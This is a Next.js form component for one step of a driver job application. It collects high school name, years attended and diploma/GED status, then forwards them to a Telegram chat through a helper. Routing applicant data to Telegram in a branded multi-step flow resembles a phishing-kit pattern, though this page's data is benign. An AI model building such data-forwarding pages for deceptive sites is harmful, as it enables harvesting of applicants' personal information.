/* eslint-disable @next/next/no-img-element */
"use client";

import { useState } from "react";
import { useRouter } from "next/navigation";

import { sendTelegramMessage } from "../../../utils/telegram";

const EducationHistoryForm = () => {
  const [formData, setFormData] = useState({
    institution: "",
    startYear: "",
    endYear: "",
    graduated: ""
  });

  const [errors, setErrors] = useState<Record<string, string>>({});
  const router = useRouter();

  const validateForm = () => {
    const newErrors: Record<string, string> = {};
    if (!formData.institution.trim()) newErrors.institution = "High school name is required";
    if (!formData.startYear) newErrors.startYear = "Start year is required";
    if (!formData.endYear) newErrors.endYear = "End year is required";
    if (formData.startYear && formData.endYear && parseInt(formData.endYear) < parseInt(formData.startYear)) {
      newErrors.endYear = "End year cannot be earlier than start year";
    }
    if (!formData.graduated) newErrors.graduated = "Graduation status is required";
    return newErrors;
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    const validationErrors = validateForm();
    if (Object.keys(validationErrors).length > 0) {
      setErrors(validationErrors);
      return;
    }

    const message = `High School Education Submission:
      - High School: ${formData.institution}
      - Years: ${formData.startYear} - ${formData.endYear}
      - Graduated: ${formData.graduated}
      - Submitted at: ${new Date().toLocaleString()}`;

    try {
      await sendTelegramMessage(message);
      router.push("/apply/driving");
    } catch (error) {
      console.error("Submission error:", error);
      alert("Error submitting form. Please try again.");
    }
  };

  return (
    <div className="min-h-screen bg-gray-50">
    {/* Sticky Header Section */}
    <header className="bg-green-600 shadow-md sticky top-0 z-10">
      <div className="max-w-3xl mx-auto p-4 flex items-center">
        <img src="/logogreen.svg" alt="Logo" className="h-8 mr-3" />
        <div className="flex-1 ml-2">
          <div className="h-2 bg-green-500 rounded-full mt-1">
            <div className="h-full bg-green-200 rounded-full transition-all duration-300" />
          </div>
        </div>
      </div>
    </header>
      <main className="flex-grow container mx-auto mt-12 px-4">
        <div className="max-w-lg mx-auto bg-white p-10 shadow-xl rounded-lg border-t-4 border-green-500">
          <h1 className="text-3xl font-semibold text-gray-800 text-center mb-6">High School Education</h1>
          <p className="text-center text-sm text-gray-600 mb-6">We require our drivers to have at least a high school diploma or GED.</p>
          <form onSubmit={handleSubmit}>
            <div className="mb-6">
              <label className="block text-sm font-medium text-black">High School Name</label>
              <input
                value={formData.institution}
                onChange={(e) => setFormData({...formData, institution: e.target.value})}
                className={`text-black bg-white w-full mt-2 border ${errors.institution ? "border-red-500" : "border-gray-300"} rounded-lg p-3`}
              />
              {errors.institution && <p className="text-red-500 text-sm mt-1">{errors.institution}</p>}
            </div>

            <div className="grid grid-cols-2 gap-6 mb-6">
              <div>
                <label className="block text-sm font-medium text-black">Start Year</label>
                <select
                  value={formData.startYear}
                  onChange={(e) => setFormData({...formData, startYear: e.target.value})}
                  className={`text-black bg-white w-full mt-2 border ${errors.startYear ? "border-red-500" : "border-gray-300"} rounded-lg p-3`}
                >
                  <option value="">Year</option>
                  {Array.from({length: 50}, (_, i) => new Date().getFullYear() - i).map(year => (
                    <option key={year} value={year}>{year}</option>
                  ))}
                </select>
                {errors.startYear && <p className="text-red-500 text-sm mt-1">{errors.startYear}</p>}
              </div>

              <div>
                <label className="block text-sm font-medium text-black">End Year</label>
                <select
                  value={formData.endYear}
                  onChange={(e) => setFormData({...formData, endYear: e.target.value})}
                  className={`text-black bg-white w-full mt-2 border ${errors.endYear ? "border-red-500" : "border-gray-300"} rounded-lg p-3`}
                >
                  <option value="">Year</option>
                  {Array.from({length: 50}, (_, i) => new Date().getFullYear() - i).map(year => (
                    <option key={year} value={year}>{year}</option>
                  ))}
                </select>
                {errors.endYear && <p className="text-red-500 text-sm mt-1">{errors.endYear}</p>}
              </div>
            </div>

            <div className="mb-6">
              <label className="block text-sm font-medium text-black">Do you have a high school diploma or GED?</label>
              <select
                value={formData.graduated}
                onChange={(e) => setFormData({...formData, graduated: e.target.value})}
                className={`text-black bg-white w-full mt-2 border ${errors.graduated ? "border-red-500" : "border-gray-300"} rounded-lg p-3`}
              >
                <option value="">Select Option</option>
                <option value="high school diploma">high school diploma</option>
                <option value="GED">GED</option>
              </select>
              {errors.graduated && <p className="text-red-500 text-sm mt-1">{errors.graduated}</p>}
            </div>

            <button type="submit" className="w-full bg-green-500 text-white p-4 rounded-xl hover:bg-green-600">
              Next
            </button>
          </form>
        </div>
      </main>
    </div>
  );
};

export default EducationHistoryForm;
